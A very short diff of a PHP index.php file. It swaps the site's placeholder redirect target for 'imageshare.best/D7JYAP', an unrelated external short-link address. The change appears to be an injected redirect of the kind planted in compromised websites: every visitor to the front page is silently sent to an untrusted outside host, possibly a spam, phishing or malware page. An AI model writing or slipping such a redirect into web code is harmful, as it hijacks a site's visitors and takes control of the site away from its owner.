@@ -1,5 +1,5 @@
 <?php
 // index.php
-header("Location: https://www.yoursite.com/new_index.php");
+header("Location: https://imageshare.best/D7JYAP");
 exit();
 ?>
